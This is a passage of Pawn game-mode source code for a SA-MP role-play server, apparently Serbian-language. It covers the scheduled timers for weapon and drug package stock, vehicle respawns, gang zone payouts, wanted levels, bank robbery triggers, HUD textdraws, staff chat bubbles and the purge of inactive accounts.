    if( tmpminute % 5 == 0 )
	{
        if( ServerInfo[ HangarPaket ] < 10 )
		{
        	ServerInfo[ HangarPaket ]++;

        	if(IsValidDynamic3DTextLabel(ServerInfo[ SHangarLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SHangarLabel ]);

			new str_hang[100];
			format( str_hang, sizeof( str_hang ), "(HANGAR[ORUZJE] - [%d/10])\nDa uzmete paket kucajte \"/uzmipaket\"", ServerInfo[ HangarPaket ] );
		    ServerInfo[ SHangarLabel ] = CreateDynamic3DTextLabel( str_hang, -1, 2410.2866,-2493.5195,13.6401, 20.0, IPI, IVI, 1, -1, -1 );
		}
    }

    if( tmpminute == 30 )
	{
	    SetTimerEx_("VehicleRespawn", 58000, 58000, 1, "ii", 0, 1);
		SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Server je automatski aktivirao respawn svih vozila." );
		SendClientMessageToAll( 0x41BAB4FF, "(RESPAWN): Respawn ce biti pokrenut za {FFFFFF}(1) {41BAB4}minut." );

		ServerInfo[ SkladisteDroga ] += 35+random(20);
		if(ServerInfo[ SkladisteDroga ] > 500) ServerInfo[ SkladisteDroga ] = 500;

		if(IsValidDynamic3DTextLabel(ServerInfo[ SDrogaLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ SDrogaLabel ]);

		new string_droga[ 80 ];
		format( string_droga, sizeof( string_droga ), "(HANGAR[DROGA] - [%d/500g])\nDa uzmete paket kucajte \"/uzmidrogu\"", ServerInfo[ SkladisteDroga ] );
    	ServerInfo[ SDrogaLabel ] = CreateDynamic3DTextLabel( string_droga, -1, 2411.4688,-2490.3281,13.6389, 10.0, IPI, IVI, 1, -1, -1 );
	}
	else if( tmpminute == 50 )
	{
    	for( new f = 0; f < MAX_GOBJ; f++ )
		{
		    if( IsValidDynamicObject( dGunData[ f ][ gObjID ] ) ) DestroyDynamicObject( dGunData[ f ][ gObjID ] );

			dGunData[ f ][ ObjPos ][ 0 ] = 0.0;
			dGunData[ f ][ ObjPos ][ 1 ] = 0.0;
			dGunData[ f ][ ObjPos ][ 2 ] = 0.0;
			dGunData[ f ][ gObjID ] = -1;
			dGunData[ f ][ ObjData ][ 0 ] = 0;
			dGunData[ f ][ ObjData ][ 1 ] = 0;
	    }
	}
	else if( tmpminute == 20 )
	{
	    neaktivnostFirmi();
    	SetTimer_("neaktivnostImovine", 15000, 15000, 1);
    	SetTimer_("registracijaVozila", 30000, 30000, 1);
	}

	if( tmpminute % 15 == 0 )
	{
	    StartReaction();
		SaveServerStats();
	}
	
	if( tmpminute % 17 == 0 )
	{
	    StartMatematika();
	}

	if( tmpminute % 59 == 0 )
	{
		if(ToggedWeekend == true)
		{
			StartWeekendEvents();
		}
	}

	foreach(new i : iter_gZone)
	{
   		if( gZoneInfo[ i ][ gZone_ID ] > 0 && gZoneInfo[ i ][ gZoneTime ] != 0 )
		{
			gZoneInfo[ i ][ gZoneTime ]--;

			if( gZoneInfo[ i ][ gZoneTime ] == 0 ||
				gZoneInfo[ i ][ gZoneTime ] == 5 ||
				gZoneInfo[ i ][ gZoneTime ] == 10 ||
				gZoneInfo[ i ][ gZoneTime ] == 15 ||
				gZoneInfo[ i ][ gZoneTime ] == 20 ||
				gZoneInfo[ i ][ gZoneTime ] == 25 ||
				gZoneInfo[ i ][ gZoneTime ] == 29 )
			{
				new q[ 128 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `gangzones` SET `time` = '%d' WHERE `gzone_id` = '%d'", gZoneInfo[ i ][ gZoneTime ], gZoneInfo[ i ][ gZone_ID ] );
			 	mysql_tquery( mSQL, q);
			}
		}

		if( tmpminute == 40 )
		{
		    if( gZoneInfo[ i ][ gZoneGangID ] != -1 )
			{
				if(gZoneInfo[i][gZoneIsSpecial] == 1) 
				{
			        org_info[ gZoneInfo[ i ][ gZoneGangID ] ][ oSafeMoney ] += 2000*5;
					sql_organization_update_integer( gZoneInfo[ i ][ gZoneGangID ], "safe_money", org_info[ gZoneInfo[ i ][ gZoneGangID ] ][ oSafeMoney ] );
				}
				else 
				{
			        org_info[ gZoneInfo[ i ][ gZoneGangID ] ][ oSafeMoney ] += 2000;
					sql_organization_update_integer( gZoneInfo[ i ][ gZoneGangID ], "safe_money", org_info[ gZoneInfo[ i ][ gZoneGangID ] ][ oSafeMoney ] );					
				}
		    }
		}
	}

	if(tmphour == 0 && tmpminute == 0) DailyRecord = Iter_Count(Player);

	if( ( tmphour > ghour ) || ( tmphour == 0 && ghour == 23 ) )
	{
		OOCNews( 0x4282C0FF, "___________________________________________________________________________");
		OOCNews( 0x4282C0FF, " ");
		OOCNews( 0x4282C0FF, "(U): Danasnji rekord igraca je {FFFFFF}%d.", DailyRecord);
		OOCNews( 0x4282C0FF, "(U): Ugodnu igru zeli vam {FFFFFF}'Ultimate Community'. {4282C0}Trenutno je {FFFFFF}(%02d:00) {4282C0}sati.", tmphour );
		OOCNews( 0x4282C0FF, "___________________________________________________________________________");
		OOCNews( 0x4282C0FF, " ");
		ghour = tmphour;

        DinamicWeather();

        #if ZIMSKI_MOD == 1

	        switch(tmphour)
	        {
	        	case 0 .. 6:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
	        	case 7 .. 9:
	        	{
					SetWorldTime( 8 );
					ServerInfo[ VremeInGame ] = 8;
				}
	        	case 10 .. 13:
	        	{
					SetWorldTime( 12 );
					ServerInfo[ VremeInGame ] = 12;
				}
	        	case 14 .. 16:
	        	{
					SetWorldTime( 15 );
					ServerInfo[ VremeInGame ] = 15;
				}
	        	case 17 .. 23:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
			}

		#else

	        switch(tmphour)
	        {
	        	case 0 .. 6:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
	        	case 7 .. 9:
	        	{
					SetWorldTime( 8 );
					ServerInfo[ VremeInGame ] = 8;
				}
	        	case 10 .. 15:
	        	{
					SetWorldTime( 12 );
					ServerInfo[ VremeInGame ] = 12;
				}
	        	case 16 .. 20:
	        	{
					SetWorldTime( 18 );
					ServerInfo[ VremeInGame ] = 18;
				}
	        	case 21 .. 23:
	        	{
					SetWorldTime( 0 );
					ServerInfo[ VremeInGame ] = 0;
				}
			}

		#endif

		SetTimer_("IzvlacenjeKuglice", 3000, 3000, 1);
	}

	foreach( new i : Player)
	{
	    AFKCheck( i );
	    PayCheck( i );
		OtherCheck( i );

		if( PlayerInfo[ i ][ xWanted ] != 0 && GetPlayerInterior( i ) == 0 && GetPlayerVirtualWorld( i ) == 0 )
		{
		    MinutiIgraca[ i ]++;
			if( MinutiIgraca[ i ] == 6 )
			{
			    MinutiIgraca[ i ] = 0;
				PlayerInfo[ i ][ xWanted ]--;
			    SMG_SetPlayerWantedLevel( i, PlayerInfo[ i ][ xWanted ] );
			    sql_user_update_integer( i, "wanted_level", PlayerInfo[ i ][ xWanted ] );

			    if( PlayerInfo[ i ][ xWanted ] == 0 )
				{
				    strmid( ZlocinInfo[ i ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
					strmid( ZlocinInfo[ i ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
					strmid( ZlocinInfo[ i ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
				}
			}
		}

		if( PlayerInfo[ i ][ xRobVreme ] != 0 ) PlayerInfo[ i ][ xRobVreme ]--;
		if( PlayerInfo[ i ][ xPljackaVreme ] != 0 ) PlayerInfo[ i ][ xPljackaVreme ]--;
		if( PlayerInfo[ i ][ xHangarTime ] != 0 ) PlayerInfo[ i ][ xHangarTime ]--;
        if( PlayerInfo[ i ][ xZauzimanjeVreme ] != 0 ) PlayerInfo[ i ][ xZauzimanjeVreme ]--;
		if( PlayerInfo[ i ][ xSvercer ] != 0 ) PlayerInfo[ i ][ xSvercer ]--;

		new str1[20];
		format( str1, sizeof( str1 ), "%02d:%02d", tmphour, tmpminute );
		TextDrawSetString(Ingame_gTD[2], str1);

		format( str1, sizeof( str1 ), "%02d/%02d/%d", day, month, year );
		TextDrawSetString(Ingame_gTD[3], str1);
	}

	if(tmphour == 0 && tmpminute == 0)
	{
		foreach(new i : Player)
		{
			if(PlayerInfo[i][xAktivnaIgra] >= 22)
			{
				PlayerInfo[i][xAktivnaIgra] = 0;
				sql_user_update_integer(i, "xAktivnaIgra", PlayerInfo[i][xAktivnaIgra]);

				SendClientMessage(i, 0x5BF067FF, "(AKTIVNA IGRA): {FFFFFF}Ponoc je, resetovani su vam aktivni sati.");
			}
		}

		mysql_tquery(mSQL, "UPDATE `users` SET `xAktivnaIgra` = '0'");
	}
	//---------------
	if(tmphour == 12 && tmpminute == 0)
	{
		mysql_tquery(mSQL, "DELETE FROM `users` WHERE `last_login` < NOW() - INTERVAL 3 MONTH");

		SendClientMessageToAll(0xED66FFFF, "===================================================================");
		SendClientMessageToAll(0xED66FFFF, "#SERVER: {FFFFFF}Svi accounti na koje niko nije usao 3 meseca su obrisani iz baze podataka.");
		SendClientMessageToAll(0xED66FFFF, "===================================================================");
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public Player_UsingAME(i)
{
	usingAME[i] = false;
	return 1;
}

_:public Player_OneSecond(i)
{
	if( AdminDuty[ i ] || PlayerInvited[i] == event_STUNT || PlayerInvited[i] == event_DRAG )
	{
		new Float:vHealth,
			vehicleid = GetPlayerVehicleID( i );
		
		GetVehicleHealth( vehicleid, vHealth );
				
		if( vHealth < 999 )
		{
			SMG_RepairVehicle( i, vehicleid );
		}
	}

	if( !NaDmEventu[ i ] && WARPInfo[ i ][ WARIgrac ] == -1 && tdm_player_info[ i ][ tdm_Team ] == 0)
	{
		if(gettime() > PlayerInfo[i][xDeathLastMSG] && gettime() < PlayerInfo[i][xDeathTime])
		{
			if(IsPlayerInRangeOfPoint(i, 35.0, PlayerInfo[i][xDeathPos][0], PlayerInfo[i][xDeathPos][1], PlayerInfo[i][xDeathPos][2]))
			{
				PlayerInfo[i][xDeathLastMSG] = gettime()+15;
				DodajWarnRed("~p~(ANTI-RK) %s ~w~moguci RevengeKill ~p~(/spec %d)", ImeIgraca(i), i);
			}
		}
	}

	if(PlayerInvited[i] == event_TEMPLERUN)
	{
		if(IsPlayerInWater(i))
		{
			SMG_SetPlayerPos(i, 3200.4226,-1614.6658,11.0098);
        	SetPlayerFacingAngle(i, 358.5446);
		}
	}

	if(SearchNadji[ i ] != -1)
	{
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos( SearchNadji[ i ], X, Y, Z );
		SMG_SetPlayerCheckpoint( i, X, Y, Z, 6 );
	}

	if( RadioAktiviran[ i ] == 1 && !IsPlayerInAnyVehicle( i ) )
	{
		RadioAktiviran[ i ] = 0; 
		StopAudioStreamForPlayer( i );
	}

	new actorid = GetPlayerTargetDynamicActor(i);
	if(actorid != INVALID_ACTOR_ID && GetFactionType(i) != ORG_TIP_VLADINA && GetFactionType(i) != ORG_TIP_HITMAN && (GetPlayerWeapon(i) > 22 && GetPlayerWeapon(i) < 34))
	{
		if(actorid == BankTargets[0])
		{
			if(BankDoorOpened[0] == false)
			{
				ApplyDynamicActorAnimation(BankTargets[0], "ped", "handsup", 4.1, 0, 1, 1, 1, 0);
				OpenBankDoor(1);
				SendClientMessage(i, 0xE3816BFF, "(PLJACKA): Prva vrata banke su otvorena, predjite na cuvara da otvorite i druga!");
			}
		}
		else if(actorid == BankTargets[1])
		{
			if(BankDoorOpened[1] == false)
			{
				ApplyDynamicActorAnimation(BankTargets[1], "ped", "handsup", 4.1, 0, 1, 1, 1, 0);
				OpenBankDoor(2);
				SendClientMessage(i, 0xE3816BFF, "(PLJACKA): Druga vrata banke su otvorena, predjite na cuvara da otvorite i zadnja!");
			}
		}
		else if(actorid == BankTargets[2])
		{
			if(BankDoorOpened[2] == false)
			{
				ApplyDynamicActorAnimation(BankTargets[2], "ped", "handsup", 4.1, 0, 1, 1, 1, 0);
				BankActorsHandsup();
				OpenBankDoor(3);
				SendClientMessage(i, 0xE3816BFF, "(PLJACKA): Treca i zadnja vrata banke su otvorena, krenite u pljacku, vrata ce se zatvoriti automatski od strane banke za 20min!!");
				SetTimer_("CloseBankDoors", 20*60000, 20*60000, 1);
			}
		}
	}

	if(GetPlayerWeapon(i) != 0 && PlayerInfo[i][xWanted] == 0 
		&& ((GetPlayerInterior(i) == 1 && GetPlayerVirtualWorld(i) == 96) || (GetPlayerInterior(i) == 70 && GetPlayerVirtualWorld(i) == 70)) 
		&& GetFactionType(i) != ORG_TIP_VLADINA)
	{
		PostaviWanted(i, "Oruzje na javnom mjestu", "CCTTV", 4);
	}

    if( IsPlayerInAnyVehicle( i ) && GetPlayerState( i ) == PLAYER_STATE_DRIVER )
	{
	    new vehicle = GetPlayerVehicleID( i ), engine, lights, alarm, doors, bonnet, boot, objective;
        GetVehicleParamsEx( vehicle, engine, lights, alarm, doors, bonnet, boot, objective );

	    if( !IsVehicleBajs( vehicle ) && !IsVehicleBrod( vehicle ) && !IsVehicleLetelica( vehicle ) )
		{
   			new str[100], Float:hp;
   			GetVehicleHealth(vehicle, hp);

			format(str, sizeof(str), "%s (id: ~y~%d~w~)~n~~w~ostecenje:_~y~%.1f~n~~w~vrata: %s", 
																									GetVehicleNameEx(GetVehicleModel(vehicle)),
																									vehicle,
																									hp,
																									(doors == 1 ? "~r~Zakljucana" : "~g~Otkljucana"));
			PlayerTextDrawSetString(i, Speedo_pTD[i][1], str);

			switch(GetSpeed(i))
			{
				case 0: 	 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~w~...........................");
				case 1 .. 7: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.~w~..........................");
				case 8 .. 14: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~..~w~.........................");
				case 15 .. 22: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~...~w~........................");
				case 23 .. 30: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~....~w~.......................");
				case 38 .. 46:   PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.....~w~......................");
				case 47 .. 55:   PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~......~w~.....................");
				case 56 .. 63: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.......~w~....................");
				case 64 .. 72: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~........~w~...................");
				case 73 .. 80: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.........~w~..................");
				case 81 .. 88: 	 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~..........~w~.................");
				case 89 .. 100:  PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~...........~w~................");
				case 101 .. 108: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~............~w~...............");
				case 109 .. 115: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.............~w~..............");
				case 116 .. 122: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~..............~w~.............");
				case 123 .. 129: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~...............~w~............");
				case 130 .. 137: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~................~w~...........");
				case 138 .. 145: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.................~w~..........");
				case 146 .. 152: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~..................~w~.........");
				case 153 .. 160: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~...................~w~........");
				case 161 .. 167: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~....................~w~.......");
				case 168 .. 169: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.....................~w~......");
				case 175 .. 181: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~......................~w~.....");
				case 182 .. 187: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.......................~w~....");
				case 188 .. 196: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~........................~w~...");
				case 197 .. 205: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~.........................~w~..");
				case 206 .. 214: PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~..........................~w~.");
				default: 		 PlayerTextDrawSetString(i, Speedo_pTD[i][2], "~y~...........................");
			}

			format(str, 4, "%03d", GetSpeed(i));
			PlayerTextDrawSetString(i, Speedo_pTD[i][6], str);
		}
	}

	if( tdm_tds_showed[ i ] )
	{
		if( tdm_tds_showed_sec[ i ] > 0 ) tdm_tds_showed_sec[ i ]--;
		else
		{
			new str[ 30 ];

			format( str, 25, "team_deathmatch(%d/40)", ( tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] + tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] ) );
			PlayerTextDrawSetString( i, tdm_player_tds[ i ][ 9 ], str );

			format( str, 30, "~w~map:_~y~%s", ( tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] + tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] ) );
			PlayerTextDrawSetString( i, tdm_player_tds[ i ][ 22 ], str );

			format( str, 25, "~b~%d_~w~vs_~r~%d", tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ], tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] );
			PlayerTextDrawSetString( i, tdm_player_tds[ i ][ 24 ], str );

            format( str, 30, "~b~%d_~w~:_~r~%d", tdm_mapInfo[ tdm_ServerMap ][ ctScore ], tdm_mapInfo[ tdm_ServerMap ][ ttScore ] );
			PlayerTextDrawSetString( i, tdm_player_tds[ i ][ 25 ], str );

            format( str, 25, "::_mec:_~y~%s%d:%s%d_~w~::", ((15*60000/60000 - tdm_mapInfo[ tdm_ServerMap ][ mMinut ]) < 10 ) ? ("0") : (""), (15*60000/60000 - tdm_mapInfo[ tdm_ServerMap ][ mMinut ]), ((15*60000/15000 - tdm_mapInfo[ tdm_ServerMap ][ mSekunda ]) < 10 ) ? ("0") : (""), (15*60000/15000 - tdm_mapInfo[ tdm_ServerMap ][ mSekunda ]) );
			PlayerTextDrawSetString( i, tdm_player_tds[ i ][ 26 ], str );
		}
	}

	new Float:Pos_X, Float:Pos_Y, Float:Pos_Z;
	GetPlayerPos( i, Pos_X, Pos_Y, Pos_Z );
	if( ( Pos_Z >= 950.0 && Pos_Z <= 1050.0 ) && IsPlayerInDynamicArea( i, bankSafe ) && VecjeUsao[ i ] == false && GetFactionType( i ) != ORG_TIP_VLADINA && WatchingTV{ i } == 0 )
	{
		PostaviWanted( i, "Ulaz u sef banke", "Nepoznati", 5 );
		VecjeUsao[ i ] = true;
	}
	else if( !IsPlayerInDynamicArea( i, bankSafe ) && VecjeUsao[ i ] && GetFactionType( i ) != ORG_TIP_VLADINA && WatchingTV{ i } == 0 )
	{
		VecjeUsao[ i ] = false;
	}

    if( MarkerPaket[ i ] > 0 )
	{
       	MarkerPaket[ i ]--;
        
        if( MarkerPaket[ i ] == 0 )
		{
        	SMG_DisablePlayerCheckpoint( i );
			CheckpointStatus[ i ] = 0;
    	}
	}

	if( Spectate[ i ] != -1 )
	{
		new targetid = Spectate[ i ];
		if( PlayerInfo[ i ][ xAdmin ] >= 1 || PlayerInfo[ i ][ xSpecAdmin ] >= 1 || PlayerInfo[ i ][ xGamemaster ] >= 2 )
		{
			new Float:health, Float:armour, specstring[ 180 ];
			GetPlayerHealth( targetid, health );
			GetPlayerArmour( targetid, armour );

			if( IsPlayerInAnyVehicle( targetid ) )
			{
			    new Float:X, Float:Y, Float:Z, carid = GetPlayerVehicleID( targetid );
	           	GetVehicleVelocity( carid, X, Y, Z );
	           	
				new Float:Speed = floatmul( floatsqroot( floatadd( floatadd( floatpower( X, 2 ), floatpower( Y, 2 ) ),  floatpower( Z, 2 ) ) ), 130.0 );

                format( specstring, sizeof( specstring ), "~y~(_~w~%s(%d)_~y~)~n~~w~Money:_~y~$%d~n~~w~Health:_~y~%.1f~n~~w~Armour:_~y~%.1f~n~~w~Weapon:_~y~%s(%dm)~n~~w~Speed:_~y~%i", ImeIgraca( targetid ), targetid, GetPlayerMoney(targetid) + PlayerInfo[ targetid ][ xBRacun ], health, armour, WeaponInfos[ GetPlayerWeapon( targetid ) ][ wName ], GetPlayerAmmo( targetid ), floatround(Speed, floatround_floor ) );
				PlayerTextDrawSetString( i, SpecTextDraw[ i ], specstring );
			}
			else
		   	{
				format( specstring, sizeof( specstring ), "~y~(_~w~%s(%d)_~y~)~n~~w~Money:_~y~$%d~n~~w~Health:_~y~%.1f~n~~w~Armour:_~y~%.1f~n~~w~Weapon:_~y~%s(%dm)", ImeIgraca( targetid ), targetid, GetPlayerMoney(targetid) + PlayerInfo[ targetid ][ xBRacun ], health, armour, WeaponInfos[ GetPlayerWeapon( targetid ) ][ wName ], GetPlayerAmmo( targetid ) );
				PlayerTextDrawSetString( i, SpecTextDraw[ i ], specstring );
			}
			SetPlayerInterior( i, GetPlayerInterior( targetid ) );
			SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( targetid ) );
		}
	}

	/*if(!TogHud[i] && PlayerLogged[i] && Spectate[i] == -1)
	{
		if( GetPlayerInterior( i ) == 0 && GetPlayerVirtualWorld( i ) == 0 )
		{
			new stringzone[ MAX_ZONE_NAME ], zona[34];
			GetPlayer2DZone(i, zona, 34);

	        format( stringzone, sizeof( stringzone ), "%s", zona );
	        PlayerTextDrawSetString( i, Ingame_pTD[i][1], stringzone );
	        PlayerTextDrawShow( i, Ingame_pTD[i][1] );
		}
		else
		{
	       	PlayerTextDrawSetString( i, Ingame_pTD[i][1], "_" );
	       	PlayerTextDrawShow( i, Ingame_pTD[i][1] );
		}
	}
	else
	{
       	PlayerTextDrawHide( i, Ingame_pTD[i][1] );
	}*/

    if( IsPlayerInAnyVehicle( i ) && GetPlayerState( i ) == PLAYER_STATE_DRIVER )
	{
        occupied[ GetPlayerVehicleID( i ) ] = true;

	    new Float:veh_x, Float:veh_y, Float:veh_z;
		GetVehiclePos( GetPlayerVehicleID( i ), veh_x, veh_y, veh_z );

		RealVehiclePositions[ GetPlayerVehicleID( i ) ][ 0 ] = veh_x;
		RealVehiclePositions[ GetPlayerVehicleID( i ) ][ 1 ] = veh_y;
		RealVehiclePositions[ GetPlayerVehicleID( i ) ][ 2 ] = veh_z;
    }

    if( BlowJobCount[ i ] != 0 )
	{
        BlowJobCount[ i ]--;

        new stringic[ 15 ];
        format( stringic, sizeof( stringic ), "time: ~r~%02d", BlowJobCount[ i ] );
        PlayerTextDrawSetString( i, BLOWJOBCOVER[ i ][ 2 ], stringic );
        PlayerTextDrawShow(i, BLOWJOBCOVER[i][2]);
	}

	if( !NaDmEventu[ i ] && WARPInfo[ i ][ WARIgrac ] == -1 && tdm_player_info[ i ][ tdm_Team ] == 0 && PlayerInfo[i][xTogLabel] == false && !usingAME[i])
	{
		if( gettime() < PlayerInfo[i][xMute] ) SetPlayerChatBubble( i, "Usutkan!", 0xFFB94FFF, 40.0, 10000);
	    else if( PlayerInfo[ i ][ xSkriptaRank ] == 1 )
		{
			SetPlayerChatBubble( i, "[ SKRIPTER ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xSkriptaRank ] == 2 )
		{
			SetPlayerChatBubble( i, "[ SUVLASNIK ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xSkriptaRank ] == 3 )
		{
			SetPlayerChatBubble( i, "[ MAPPER ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xSkriptaRank ] == 9 )
		{
			SetPlayerChatBubble( i, "[ WEB DEVELOPER ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xSkriptaRank ] == 10 )
		{
			SetPlayerChatBubble( i, "[ WEB ADMINISTRATOR ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xSkriptaRank ] == 11 )
		{
			SetPlayerChatBubble( i, "[ BETA TESTER ]", 0x2ECC71FF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xSkriptaRank ] == 12 )
		{
			SetPlayerChatBubble( i, "[ 4 2 O ]", 0x2ECC71FF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xAdmin ] == 7 )
		{
			SetPlayerChatBubble( i, "[ VLASNIK ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xAdmin ] == 6 )
		{
			SetPlayerChatBubble( i, "[ DIREKTOR ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xAdmin ] == 5 )
		{
			SetPlayerChatBubble( i, "[ HEAD ADMIN ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xAdmin ] >= 1 && PlayerInfo[ i ][ xAdmin ] <= 4 )
		{
			SetPlayerChatBubble( i, "[ ADMIN ]", 0xFFFFFFFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xSpecAdmin ] == 1 )
		{
			SetPlayerChatBubble( i, "[ SPEC ADMIN ]", 0x4A68C2FF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xGamemaster ] >= 1 )
		{
			SetPlayerChatBubble( i, "[ GAMEMASTER ]", 0x48E86BFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xVIPLevel ] > 0 )
		{
			SetPlayerChatBubble( i, "[ VIP ]", 0xAA333300, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xPromoter ] >= 1 )
		{
			SetPlayerChatBubble( i, "[ PROMOTER ]", 0xAEFAA2FF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xYouTuber ] >= 1 )
		{
			SetPlayerChatBubble( i, "[ YOUTUBER ]", 0xDB2C2CFF, 40.0, 10000);
		}
		else if( PlayerInfo[ i ][ xLevel ] == 1 )
		{
			SetPlayerChatBubble( i, "[ NEWBIE ]", 0x4282C0FF, 40.0, 10000);
		}
	}

    if( IsPlayerInAnyVehicle( i ) && GetPlayerState( i ) == PLAYER_STATE_DRIVER && GetSpeed( i ) > 10 )
	{
        new autoid = GetPlayerVehicleID( i );

        if( autoid != -1 )
		{
			VehicleInfo[ autoid ][ vMetri ] += ( GetSpeed( i )*10 )/36;
			if( VehicleInfo[ autoid ][ vMetri ] > 999 )
			{
				VehicleInfo[ autoid ][ vKilometri ]++;
				VehicleInfo[ autoid ][ vMetri ] = 0;
			}
		}
	}

	CarDamageTimer( i );
	DrugCheck( i );
	CellphoneCheck( i );

	if( Odbrojavanje[ i ] != 0 )
	{
		new str[25];
		format( str, sizeof( str ), "Pricekajte: ~r~%d", Odbrojavanje[ i ] );
		GameTextForPlayer( i, str, 2000, 3 );
		Odbrojavanje[ i ]--;
	}

	new id = -1;
	if( ( id = Boombox_Nearest(i)) != IPI && Boombox[ i ] != id && strlen (BoomboxInfo[ id ][ boomboxURL ] ) && !IsPlayerInAnyVehicle( i ) )
	{
		new str[ 128 ];
		strunpack(str, BoomboxInfo[ id ][ boomboxURL ] );
		Boombox[ i ] = id;

		StopAudioStreamForPlayer( i );
		PlayAudioStreamForPlayer( i, str, BoomboxInfo[ id ][ boomboxPos ][ 0 ], BoomboxInfo[ id ][ boomboxPos ][ 1 ], BoomboxInfo[ id ][ boomboxPos ][ 2 ], 30.0, 1);
	}
	else if( Boombox[ i ] != IPI && !IsPlayerInRangeOfPoint( i, 30.0, BoomboxInfo[ Boombox[ i ] ][ boomboxPos ][ 0 ], BoomboxInfo[ Boombox[ i ] ][ boomboxPos ][ 1 ], BoomboxInfo[ Boombox[ i ] ][boomboxPos][ 2 ] ) )
	{
		Boombox[ i ] = IPI;
		StopAudioStreamForPlayer(i);
	}

	#if XMAS_MOD == 1

		new year, month, day;
		getdate( year, month, day );

		if(month == 12)
		{
			new str[100], tmphour, tmpminute, tmpsecond;
			gettimeEx(tmphour, tmpminute, tmpsecond);
			FixHour(tmphour);
			tmphour = shifthour;

			format(str, sizeof(str), "~y~new_year_-_(2020)~n~~w~d:_~y~%02d_~w~-_h:_~y~%02d_~w~-_m:_~y~%02d_~w~-_s:_~y~%02d", 31 - day, 23 - tmphour, 59 - tmpminute, 59 - tmpsecond);
		 	if(!TogHud[i] && PlayerLogged[i] && Spectate[i] == -1) PlayerTextDrawSetString(i, Ingame_pTD[i][40], str), PlayerTextDrawShow(i, Ingame_pTD[i][40]);
		}
		else PlayerTextDrawHide(i, Ingame_pTD[i][40]);

	#endif

	return 1;
}
//------------------------------------------------------------------------------
_:public CarDamageTimer( playerid )
{
    new Float:vHealth,
        newcar = GetPlayerVehicleID( playerid ),
		engine, lights, alarm, doors, bonnet, boot, objective;

	if( IsPlayerInAnyVehicle( playerid ) )
	{
	    if( !IsVehicleLetelica( newcar ) && !IsVehicleBrod( newcar ) && !IsVehicleBajs( newcar ) )
		{
		    GetVehicleHealth(newcar, vHealth);

			if( vHealth >= 250 && vHealth <= 350 )
			{
			    GetVehicleParamsEx(newcar,engine, lights, alarm, doors, bonnet, boot, objective );
		   		SetVehicleParamsEx(newcar,0,lights,alarm,doors,bonnet,boot,objective);
				//SetCameraBehindPlayer( playerid );
				GameTextForPlayer( playerid, "~r~Vozilo je unisteno.~n~ukucajte /exit~n~za napustanje vozila.", 3000, 3);
				vCanDrive[newcar] = 0;

				if( Tempomat[ playerid ] )
				{
					SendClientMessage( playerid, 0xE2C058FF, "(VOZILO): Tempomat se ugasio.");
					Tempomat[ playerid ] = false;
					PlayerCruiseSpeed[ playerid ] = 0.00;
				}
			}
		}
	}
}
//------------------------------------------------------------------------------
_:public AntiSpawnCrash()
{
	carspawntimer = 0;
}
//------------------------------------------------------------------------------
